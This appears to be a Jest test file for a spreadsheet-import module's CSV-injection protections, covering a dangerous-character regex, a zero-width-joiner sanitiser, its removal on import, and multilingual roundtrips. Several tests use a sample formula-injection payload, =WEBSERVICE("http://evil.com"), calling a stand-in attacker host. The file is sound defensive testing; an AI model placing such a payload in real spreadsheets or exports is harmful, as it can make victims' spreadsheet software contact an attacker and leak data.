import { CSV_DANGEROUS_CHARACTERS } from '@/spreadsheet-import/constants/CsvDangerousCharacters';
import { CSV_INJECTION_PREVENTION_ZWJ } from '@/spreadsheet-import/constants/CsvInjectionPreventionZwj';
import { cleanZWJFromImportedValue } from '@/spreadsheet-import/utils/cleanZWJFromImportedValue';
import { containsCSVProtectionZWJ } from '@/spreadsheet-import/utils/containsCSVProtectionZWJ';
import { sanitizeValueForCSVExport } from '@/spreadsheet-import/utils/sanitizeValueForCSVExport';

describe('csvSecurity', () => {
  describe('CSV_DANGEROUS_CHARACTERS regex', () => {
    it('should match dangerous characters at the start of strings', () => {
      expect(CSV_DANGEROUS_CHARACTERS.test('=formula')).toBe(true);
      expect(CSV_DANGEROUS_CHARACTERS.test('+calculation')).toBe(true);
      expect(CSV_DANGEROUS_CHARACTERS.test('-negative')).toBe(true);
      expect(CSV_DANGEROUS_CHARACTERS.test('@reference')).toBe(true);
      expect(CSV_DANGEROUS_CHARACTERS.test('\ttab')).toBe(true);
      expect(CSV_DANGEROUS_CHARACTERS.test('\rcarriage')).toBe(true);
    });

    it('should not match safe strings', () => {
      expect(CSV_DANGEROUS_CHARACTERS.test('normal text')).toBe(false);
      expect(CSV_DANGEROUS_CHARACTERS.test('text with = in middle')).toBe(
        false,
      );
      expect(CSV_DANGEROUS_CHARACTERS.test('text with + in middle')).toBe(
        false,
      );
      expect(CSV_DANGEROUS_CHARACTERS.test('')).toBe(false);
    });
  });

  describe('sanitizeValueForCSVExport', () => {
    it('should prefix dangerous formulas with ZWJ', () => {
      const result = sanitizeValueForCSVExport(
        '=WEBSERVICE("http://evil.com")',
      );
      expect(result).toBe(
        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE("http://evil.com")`,
      );
    });

    it('should prefix dangerous calculations with ZWJ', () => {
      expect(sanitizeValueForCSVExport('+1+1')).toBe(
        `${CSV_INJECTION_PREVENTION_ZWJ}+1+1`,
      );
      expect(sanitizeValueForCSVExport('-1+1')).toBe(
        `${CSV_INJECTION_PREVENTION_ZWJ}-1+1`,
      );
    });

    it('should prefix dangerous references with ZWJ', () => {
      expect(sanitizeValueForCSVExport('@SUM(1,1)')).toBe(
        `${CSV_INJECTION_PREVENTION_ZWJ}@SUM(1,1)`,
      );
    });

    it('should prefix dangerous control characters with ZWJ', () => {
      expect(sanitizeValueForCSVExport('\t=FORMULA()')).toBe(
        `${CSV_INJECTION_PREVENTION_ZWJ}\t=FORMULA()`,
      );
      expect(sanitizeValueForCSVExport('\r=FORMULA()')).toBe(
        `${CSV_INJECTION_PREVENTION_ZWJ}\r=FORMULA()`,
      );
    });

    it('should preserve legitimate phone numbers with ZWJ', () => {
      const phoneNumber = '+1-555-123-4567';
      const result = sanitizeValueForCSVExport(phoneNumber);
      expect(result).toBe(`${CSV_INJECTION_PREVENTION_ZWJ}+1-555-123-4567`);
      expect(result.substring(1)).toBe(phoneNumber);
    });

    it('should not modify safe strings', () => {
      expect(sanitizeValueForCSVExport('John Doe')).toBe('John Doe');
      expect(sanitizeValueForCSVExport('john@example.com')).toBe(
        'john@example.com',
      );
      expect(sanitizeValueForCSVExport('Text with = in middle')).toBe(
        'Text with = in middle',
      );
      expect(sanitizeValueForCSVExport('Text with + in middle')).toBe(
        'Text with + in middle',
      );
    });

    it('should handle null and undefined values', () => {
      expect(sanitizeValueForCSVExport(null)).toBe('');
      expect(sanitizeValueForCSVExport(undefined)).toBe('');
    });

    it('should convert non-string values to strings', () => {
      expect(sanitizeValueForCSVExport(123)).toBe('123');
      expect(sanitizeValueForCSVExport(true)).toBe('true');
      expect(sanitizeValueForCSVExport(false)).toBe('false');
    });

    it('should handle edge cases', () => {
      expect(sanitizeValueForCSVExport('')).toBe('');
      expect(sanitizeValueForCSVExport('=')).toBe(
        `${CSV_INJECTION_PREVENTION_ZWJ}=`,
      );
      expect(sanitizeValueForCSVExport('+')).toBe(
        `${CSV_INJECTION_PREVENTION_ZWJ}+`,
      );
    });
  });

  describe('cleanZWJFromImportedValue', () => {
    it('should remove ZWJ prefix from sanitized values', () => {
      const sanitized = `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE("http://evil.com")`;
      const cleaned = cleanZWJFromImportedValue(sanitized);
      expect(cleaned).toBe('=WEBSERVICE("http://evil.com")');
    });

    it('should restore original phone numbers', () => {
      const sanitized = `${CSV_INJECTION_PREVENTION_ZWJ}+1-555-123-4567`;
      const cleaned = cleanZWJFromImportedValue(sanitized);
      expect(cleaned).toBe('+1-555-123-4567');
    });

    it('should not modify values without ZWJ prefix', () => {
      expect(cleanZWJFromImportedValue('John Doe')).toBe('John Doe');
      expect(cleanZWJFromImportedValue('john@example.com')).toBe(
        'john@example.com',
      );
      expect(cleanZWJFromImportedValue('Normal text')).toBe('Normal text');
    });

    it('should handle non-string values gracefully', () => {
      expect(cleanZWJFromImportedValue(123 as any)).toBe(123);
      expect(cleanZWJFromImportedValue(null as any)).toBe(null);
      expect(cleanZWJFromImportedValue(undefined as any)).toBe(undefined);
    });

    it('should handle empty strings', () => {
      expect(cleanZWJFromImportedValue('')).toBe('');
      expect(cleanZWJFromImportedValue(CSV_INJECTION_PREVENTION_ZWJ)).toBe('');
    });
  });

  describe('containsCSVProtectionZWJ', () => {
    it('should detect ZWJ in sanitized values', () => {
      const sanitized = `${CSV_INJECTION_PREVENTION_ZWJ}=FORMULA()`;
      expect(containsCSVProtectionZWJ(sanitized)).toBe(true);
    });

    it('should detect ZWJ anywhere in the string', () => {
      const text = `Some text ${CSV_INJECTION_PREVENTION_ZWJ} with ZWJ in middle`;
      expect(containsCSVProtectionZWJ(text)).toBe(true);
    });

    it('should return false for strings without ZWJ', () => {
      expect(containsCSVProtectionZWJ('Normal text')).toBe(false);
      expect(containsCSVProtectionZWJ('=FORMULA()')).toBe(false);
      expect(containsCSVProtectionZWJ('')).toBe(false);
    });

    it('should handle non-string values gracefully', () => {
      expect(containsCSVProtectionZWJ(123 as any)).toBe(false);
      expect(containsCSVProtectionZWJ(null as any)).toBe(false);
      expect(containsCSVProtectionZWJ(undefined as any)).toBe(false);
    });
  });

  describe('roundtrip compatibility', () => {
    it('should preserve data through export/import cycle', () => {
      const originalValues = [
        '=WEBSERVICE("http://evil.com")',
        '+1-555-123-4567',
        '-$5,000 adjustment',
        '@mention',
        '\t=FORMULA()',
        'Normal text',
        'Text with = in middle',
      ];

      originalValues.forEach((original) => {
        const sanitized = sanitizeValueForCSVExport(original);
        const restored = cleanZWJFromImportedValue(sanitized);
        expect(restored).toBe(original);
      });
    });

    it('should maintain visual appearance for users', () => {
      const phoneNumber = '+1-555-123-4567';
      const sanitized = sanitizeValueForCSVExport(phoneNumber);

      // The sanitized version should look identical to users
      // (ZWJ is invisible in most contexts)
      expect(sanitized).toContain(phoneNumber);
      expect(sanitized.length).toBe(phoneNumber.length + 1); // +1 for ZWJ
    });
  });

  describe('international character compatibility', () => {
    it('should not interfere with Japanese characters', () => {
      const japaneseTexts = [
        'こんにちは', // "Hello" in Japanese
        '田中太郎', // Japanese name
        '東京都渋谷区', // Tokyo address
        '株式会社', // Corporation
        'ひらがな カタカナ 漢字', // Mixed Japanese scripts
        '2024年12月', // Date in Japanese
        '価格：¥1,000', // Price in yen
      ];

      japaneseTexts.forEach((text) => {
        const sanitized = sanitizeValueForCSVExport(text);
        // Should remain unchanged (no dangerous characters at start)
        expect(sanitized).toBe(text);
        expect(containsCSVProtectionZWJ(sanitized)).toBe(false);
      });
    });

    it('should not interfere with Chinese characters', () => {
      const chineseTexts = [
        '你好世界', // "Hello World" in Chinese
        '北京市朝阳区', // Beijing address
        '有限公司', // Limited company
        '2024年12月31日', // Date in Chinese
        '价格：¥100.00', // Price in yuan
      ];

      chineseTexts.forEach((text) => {
        const sanitized = sanitizeValueForCSVExport(text);
        expect(sanitized).toBe(text);
        expect(containsCSVProtectionZWJ(sanitized)).toBe(false);
      });
    });

    it('should not interfere with Korean characters', () => {
      const koreanTexts = [
        '안녕하세요', // "Hello" in Korean
        '서울특별시 강남구', // Seoul address
        '주식회사', // Corporation
        '김철수', // Korean name
        '가격: ₩10,000', // Price in won
      ];

      koreanTexts.forEach((text) => {
        const sanitized = sanitizeValueForCSVExport(text);
        expect(sanitized).toBe(text);
        expect(containsCSVProtectionZWJ(sanitized)).toBe(false);
      });
    });

    it('should not interfere with Arabic characters', () => {
      const arabicTexts = [
        'مرحبا بالعالم', // "Hello World" in Arabic
        'شركة محدودة المسؤولية', // Limited liability company
        'الرياض، المملكة العربية السعودية', // Riyadh, Saudi Arabia
        'السعر: 100 ريال', // Price in riyal
      ];

      arabicTexts.forEach((text) => {
        const sanitized = sanitizeValueForCSVExport(text);
        expect(sanitized).toBe(text);
        expect(containsCSVProtectionZWJ(sanitized)).toBe(false);
      });
    });

    it('should not interfere with European accented characters', () => {
      const europeanTexts = [
        'Café München', // German with umlauts
        'José María García', // Spanish with accents
        'François Müller', // French with cedilla
        'Åse Øberg', // Scandinavian characters
        'Zürich, Schweiz', // Swiss German
        'Москва, Россия', // Russian Cyrillic
      ];

      europeanTexts.forEach((text) => {
        const sanitized = sanitizeValueForCSVExport(text);
        expect(sanitized).toBe(text);
        expect(containsCSVProtectionZWJ(sanitized)).toBe(false);
      });
    });

    it('should handle international text with dangerous characters at start', () => {
      const mixedTexts = [
        '+81-3-1234-5678 (Tokyo office)', // Japanese phone with country code
        '=SUM(売上高)', // Formula with Japanese text
        '@田中さん こんにちは', // Mention with Japanese name
        '-€50.00 (European discount)', // Negative amount in euros
        '+33% 增长率', // Percentage with Chinese
      ];

      mixedTexts.forEach((text) => {
        const sanitized = sanitizeValueForCSVExport(text);
        const restored = cleanZWJFromImportedValue(sanitized);

        // Should be sanitized (starts with dangerous character)
        expect(sanitized).toBe(CSV_INJECTION_PREVENTION_ZWJ + text);
        expect(containsCSVProtectionZWJ(sanitized)).toBe(true);

        expect(restored).toBe(text);
      });
    });

    it('should not add ZWJ to legitimate Unicode combining characters', () => {
      const unicodeTexts = [
        'é', // e with acute accent (U+00E9)
        'e\u0301', // e + combining acute accent
        'नमस्ते', // Hindi greeting
        'مرحبا', // Arabic greeting
        '🇯🇵', // Japanese flag emoji (regional indicators)
        '👨‍👩‍👧‍👦', // Family emoji with ZWJ sequences
      ];

      unicodeTexts.forEach((text) => {
        const sanitized = sanitizeValueForCSVExport(text);
        // Should remain unchanged (no dangerous ASCII characters at start)
        expect(sanitized).toBe(text);

        // Should not add our protection ZWJ (unless already present in emoji sequences)
        if (!text.includes('\u200D')) {
          expect(containsCSVProtectionZWJ(sanitized)).toBe(false);
        }
      });
    });
  });

  describe('CSV import integration', () => {
    it('should work with the mapWorkbook import process', () => {
      // Simulate data that would come from a CSV export with ZWJ protection
      const exportedData = [
        ['Name', 'Formula', 'Phone'],
        [
          'John Doe',
          `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE("http://evil.com")`,
          `${CSV_INJECTION_PREVENTION_ZWJ}+1-555-123-4567`,
        ],
        ['Jane Smith', 'Normal text', '+44-20-1234-5678'],
      ];

      const cleanedData = exportedData.map((row) =>
        row.map((cell) =>
          typeof cell === 'string' ? cleanZWJFromImportedValue(cell) : cell,
        ),
      );

      expect(cleanedData).toEqual([
        ['Name', 'Formula', 'Phone'],
        ['John Doe', '=WEBSERVICE("http://evil.com")', '+1-555-123-4567'],
        ['Jane Smith', 'Normal text', '+44-20-1234-5678'],
      ]);
    });

    it('should handle mixed data types during import', () => {
      const mixedData = [
        ['Text', 'Number', 'Boolean', 'Null'],
        [`${CSV_INJECTION_PREVENTION_ZWJ}=FORMULA()`, 123, true, null],
        ['Normal text', 456, false, undefined],
      ];

      const cleanedData = mixedData.map((row) =>
        row.map((cell) =>
          typeof cell === 'string' ? cleanZWJFromImportedValue(cell) : cell,
        ),
      );

      expect(cleanedData).toEqual([
        ['Text', 'Number', 'Boolean', 'Null'],
        ['=FORMULA()', 123, true, null],
        ['Normal text', 456, false, undefined],
      ]);
    });

    it('should preserve international characters during import roundtrip', () => {
      const internationalData = [
        ['Japanese', 'Chinese', 'Arabic'],
        ['こんにちは', '你好', 'مرحبا'],
        [`${CSV_INJECTION_PREVENTION_ZWJ}+81-3-1234-5678`, '北京市', 'الرياض'],
      ];

      const cleanedData = internationalData.map((row) =>
        row.map((cell) =>
          typeof cell === 'string' ? cleanZWJFromImportedValue(cell) : cell,
        ),
      );

      expect(cleanedData).toEqual([
        ['Japanese', 'Chinese', 'Arabic'],
        ['こんにちは', '你好', 'مرحبا'],
        ['+81-3-1234-5678', '北京市', 'الرياض'],
      ]);
    });
  });
});
